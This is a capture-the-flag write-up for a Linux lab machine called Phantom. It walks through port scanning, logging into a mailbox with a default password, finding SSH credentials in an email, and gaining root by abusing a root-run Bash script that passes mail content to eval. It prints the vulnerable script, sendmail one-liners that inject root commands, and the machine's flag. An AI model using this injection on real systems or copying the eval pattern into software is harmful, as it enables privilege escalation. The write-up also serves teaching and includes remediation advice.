---
title: "Phantom - Nestcon"
date: 2026-11-02
author: "Nana Osei Sarpong"
categories: [Cybersecurity, CTF]
tags:
  - Nestcon
  - Phantom
  - Nmap
  - Linux
  - SSH
  - IMAP
  - Dovecot
  - Command Injection
  - Privilege Escalation
---

# Phantom - Nestcon

## Introduction

Phantom is a Linux machine from Nestcon that demonstrates how weaknesses in custom system automation can lead to complete system compromise.

My approach involved network reconnaissance, service enumeration, mailbox investigation, initial access, Linux privilege escalation enumeration, and exploitation of a vulnerable mail-processing script.

The most interesting part of this machine was discovering that a privileged Bash script used `eval` to execute commands obtained from the root mailbox. By understanding how the script processed incoming messages, I was able to execute commands as root and retrieve the final flag.

## Machine Information

| Information | Details |
|---|---|
| Platform | Nestcon |
| Machine | Phantom |
| Hostname | phantom-build |
| Operating System | Debian 12 |
| Initial User | james |
| Privilege Escalation | Command Injection |
| Final User | root |
| Final Status | Pwned |

---

# 1. Reconnaissance

I started by identifying the target's exposed services and understanding the available attack surface.

## 1.1 Nmap Enumeration

The initial scan identified several open ports, including SSH, a WHOIS-like service, and multiple mail services.

The recorded target address during initial enumeration was:

```text
10.10.112.17
```

### Discovered ports

| Port | Service | Details |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian |
| 43/tcp | WHOIS | Custom WHOIS responder |
| 110/tcp | POP3 | Dovecot |
| 143/tcp | IMAP | Dovecot |
| 993/tcp | IMAPS | Dovecot |
| 995/tcp | POP3S | Dovecot |

The presence of several mail-related services immediately made the mail infrastructure an interesting area to investigate.

*Note: The original Nmap command and complete raw scan output were not retained in the available session history. The ports and service findings above are the recorded results.*

## 1.2 Understanding the Attack Surface

From the scan results, I identified three main areas worth investigating:

- SSH for potential remote access.
- The WHOIS-like service for information disclosure.
- The mail services for possible user and mailbox enumeration.

I decided to investigate the exposed services individually.

---

# 2. Service Enumeration

## 2.1 SSH - Port 22

The SSH service was running OpenSSH 9.2p1 on Debian.

SSH was a potential entry point, but I did not immediately focus on brute-forcing credentials. Instead, I continued investigating the other services for useful information.

## 2.2 WHOIS - Port 43

Port 43 exposed a custom WHOIS-like service.

I connected to it using Netcat:

```bash
nc -nv 10.10.112.17 43
```

The service returned information associated with the domain:

```text
phantom.ulfr
```

It also exposed contact information associated with:

```text
sysadmin@phantom.ulfr
```

This was useful because it revealed a domain name and a potential username associated with the machine.

The service was later identified as a static Python WHOIS responder:

```text
/usr/local/bin/whois-server.py
```

It returned fixed WHOIS information rather than providing an obvious command injection opportunity.

## 2.3 POP3 - Port 110

Next, I investigated the POP3 service.

```bash
nc -nv 10.10.112.17 110
```

The service returned a Dovecot banner:

```text
+OK Dovecot (Debian) ready
```

I requested the available capabilities:

```text
CAPA
```

The response included authentication mechanisms such as:

```text
USER
SASL PLAIN LOGIN
STLS
```

This confirmed that the machine was running Dovecot and exposed a mail authentication service.

## 2.4 IMAP - Port 143

I also investigated the IMAP service.

IMAP was particularly interesting because it could provide access to stored messages, potentially revealing credentials, usernames, or information about the machine.

The encrypted IMAP service was also available on port 993.

## 2.5 IMAPS - Port 993

After identifying the encrypted IMAP service, I attempted mailbox authentication using the discovered `sysadmin` account.

The credentials were:

```text
Username: sysadmin
Password: sysadmin
```

The authentication succeeded, giving me access to the mailbox.

This became an important turning point in the enumeration process.

## 2.6 POP3S - Port 995

Port 995 exposed encrypted POP3 through Dovecot.

Together, the exposed mail services indicated that the machine relied heavily on its local mail infrastructure.

---

# 3. Mailbox Enumeration

After successfully authenticating to the `sysadmin` mailbox, I began investigating the available messages.

The mailbox contained 18 messages.

Rather than focusing only on the authentication mechanism, I examined the messages for information that could help me obtain access to the system.

Some messages contained information about infrastructure activity, including SSH login failures involving:

```text
INFRA-02.phantom.ulfr
```

Other messages discussed security events and account information.

## 3.1 Discovering the James Credentials

The most important discovery was **message ID 14**.

This message contained credentials associated with the `james` account.

The credentials were:

```text
Username: james
Password: J@m3sPhant0m#99
```

This provided the information needed to move from mailbox access to an interactive system account.

The lesson here was that mailbox enumeration can reveal information that is not directly exposed through the network services themselves.

---

# 4. Initial Access

With the credentials recovered from the `sysadmin` mailbox, I moved on to accessing the machine through SSH.

The account I obtained access to was:

```text
james
```

The machine identified itself as:

```text
phantom-build
```

My shell prompt confirmed the successful access:

```text
james@phantom-build:~$
```

At this stage, I had an interactive shell on the target and could begin local enumeration.

---

# 5. Post-Exploitation Enumeration

After obtaining access as `james`, I began enumerating the Linux environment to identify possible privilege escalation vectors.

## 5.1 User Information

I checked my current identity and group membership:

```bash
whoami
id
```

The output showed:

```text
uid=1001(james) gid=1001(james) groups=1001(james)
```

This confirmed that I was operating as an ordinary user without membership in the `mail` group.

## 5.2 Operating System Information

I checked the operating system and kernel:

```bash
uname -a
cat /etc/os-release
```

The machine was running Debian 12 with a Linux 6.1 kernel.

## 5.3 Checking Sudo Permissions

I checked whether the current account had any sudo privileges:

```bash
sudo -l
```

The account did not have sudo permissions.

This meant that traditional sudo-based privilege escalation was not immediately available.

## 5.4 Enumerating Custom Directories

I continued investigating directories that commonly contain locally installed applications and administrative scripts.

```bash
ls -lah /opt
find /opt -type f -ls
```

Two interesting scripts were discovered:

```text
/opt/mail-processor.sh
/opt/ulfr/inject-flag.sh
```

Both files were owned by root.

The mail-processing script immediately caught my attention because it interacted with the root mailbox.

---

# 6. Discovering the Privilege Escalation Vulnerability

## 6.1 Inspecting mail-processor.sh

I examined the script:

```bash
cat /opt/mail-processor.sh
```

The contents were:

```bash
#!/bin/bash

MAILBOX="/var/mail/root"
LOCK="/tmp/.mail-proc.lock"

[ -f "$LOCK" ] && exit 0
touch "$LOCK"

if [ -s "$MAILBOX" ]; then
    while IFS= read -r line; do
        if [ "$line" = "[SYSCTL]" ]; then
            read -r cmd
            if [ -n "$cmd" ]; then
                eval "$cmd"
            fi
        fi
    done < "$MAILBOX"
    > "$MAILBOX"
fi

rm -f "$LOCK"
```

## 6.2 Understanding the Script

The script defined the root mailbox:

```bash
MAILBOX="/var/mail/root"
```

It also created a lock file to prevent multiple executions:

```bash
LOCK="/tmp/.mail-proc.lock"
```

The most important part was:

```bash
if [ "$line" = "[SYSCTL]" ]; then
    read -r cmd
    if [ -n "$cmd" ]; then
        eval "$cmd"
    fi
fi
```

The script searched the mailbox for a specific marker:

```text
[SYSCTL]
```

When it encountered that marker, it read the next line and passed it to Bash's `eval` function.

The problem was that the command was executed without proper validation.

Because the script ran with root privileges, any command successfully supplied through this mechanism could execute with root privileges.

This introduced a serious command injection vulnerability.

---

# 7. Exploiting the Mail Processor

## 7.1 Understanding Mail Delivery

I investigated how messages could be delivered to the local root mailbox.

The system had a Sendmail-compatible executable:

```text
/usr/sbin/sendmail
```

Although I was operating as `james`, I could submit a local email addressed to root.

This meant that I could potentially influence the content processed by the privileged script.

## 7.2 Confirming Root Command Execution

Before attempting to access sensitive files, I used a harmless command to verify whether the vulnerability was exploitable.

I submitted the following message:

```bash
printf 'Subject: Processor diagnostic\n\n[SYSCTL]\n/usr/bin/id > /tmp/processor-check\n' | /usr/sbin/sendmail root
```

The message contained the marker:

```text
[SYSCTL]
```

followed by:

```bash
/usr/bin/id > /tmp/processor-check
```

The command was designed to save the execution identity to a temporary file.

I then checked the output:

```bash
cat /tmp/processor-check
```

The result was:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed that the injected command had executed as root.

**Privilege escalation was successfully confirmed.**

---

# 8. Retrieving the Root Flag

With root command execution confirmed, I moved on to retrieving the root flag.

The flag was located at:

```text
/root/root.txt
```

I used the same mail-processing mechanism to read the file and redirect its contents into `/tmp`:

```bash
printf 'Subject: Read root flag\n\n[SYSCTL]\n/bin/cat /root/root.txt > /tmp/root-flag-result 2>&1\n' | /usr/sbin/sendmail root
```

The output file was not immediately visible when I first checked it.

After further investigation and allowing the processing mechanism to complete, I navigated to `/tmp`:

```bash
cd /tmp
ls -lah
```

The directory contained several files generated during the exploitation process, including:

```text
root-flag-result
```

I retrieved the flag:

```bash
cat root-flag-result
```

<details>
<summary>Click to reveal the root flag</summary>

```text
nestcon{root_flag_591a7fcc4d07bebb}
```

</details>

This confirmed successful privilege escalation and complete compromise of the machine.

---

# 9. Complete Attack Path

The attack path can be summarized as follows:

```text
Nmap Reconnaissance
        |
        v
Identify exposed services
        |
        v
WHOIS and Mail Enumeration
        |
        v
Discover sysadmin mailbox
        |
        v
Read mailbox messages
        |
        v
Recover james credentials
        |
        v
Obtain SSH access as james
        |
        v
Linux post-exploitation enumeration
        |
        v
Discover /opt/mail-processor.sh
        |
        v
Identify unsafe eval operation
        |
        v
Send crafted email to root
        |
        v
Root command execution
        |
        v
Read /root/root.txt
        |
        v
       ROOT
```

---

# 10. Lessons Learned

Phantom reinforced several important security concepts.

### 10.1 Mailbox Enumeration

Mailboxes can contain sensitive operational information, including credentials, internal hostnames, and account details.

Access to an email account should never be treated as harmless.

### 10.2 Unsafe Use of eval

Bash's `eval` function executes its argument as shell code.

Using it with untrusted input can introduce arbitrary command execution vulnerabilities.

### 10.3 Privileged Automation

Scripts running with root privileges must carefully validate all input.

A small mistake in an automated process can expose the entire operating system.

### 10.4 Linux Post-Exploitation

Checking custom directories such as `/opt` can reveal attack paths that basic privilege enumeration may overlook.

### 10.5 Verify Execution Context

Using a harmless command such as `id` helped confirm that the injected command was actually executing as root before attempting to retrieve the flag.

---

# 11. Remediation

The vulnerability in the mail-processing script could be addressed through the following measures:

1. Remove the unsafe use of `eval`.
2. Never execute commands directly from untrusted email content.
3. Validate incoming data against a strict allowlist.
4. Run mail-processing scripts under a dedicated low-privilege account.
5. Apply least-privilege permissions to mailboxes and scripts.
6. Monitor privileged processes and mail-processing activity.
7. Separate email parsing from command execution.

---

# Conclusion

Phantom was a valuable Linux penetration-testing exercise.

The machine demonstrated how a seemingly ordinary mail-processing script can introduce a critical security vulnerability when it executes untrusted input with elevated privileges.

The most important part of the machine was not simply finding the vulnerable script, but understanding how the mail infrastructure, mailbox permissions, and Bash script logic worked together.

By combining network reconnaissance, mailbox enumeration, Linux post-exploitation, and careful vulnerability analysis, I was able to obtain root access.

**Machine completed. Root access obtained.**
